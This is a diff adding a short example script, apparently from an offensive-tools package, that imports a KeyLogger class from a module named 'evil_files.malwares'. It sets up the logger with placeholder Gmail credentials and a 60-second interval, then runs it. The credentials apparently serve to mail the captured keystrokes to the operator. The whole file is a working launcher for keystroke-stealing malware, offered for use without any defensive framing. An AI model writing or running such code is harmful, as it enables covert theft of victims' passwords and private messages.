+++ examples/Malwares/key_logger.py
@@ -1,0 +1,4 @@
+from pyhtools.evil_files.malwares.keylogger import KeyLogger
+
+key_logger = KeyLogger(email='yourgmailaccount', password='yourpassword', interval_in_secs=60)
+key_logger.run()
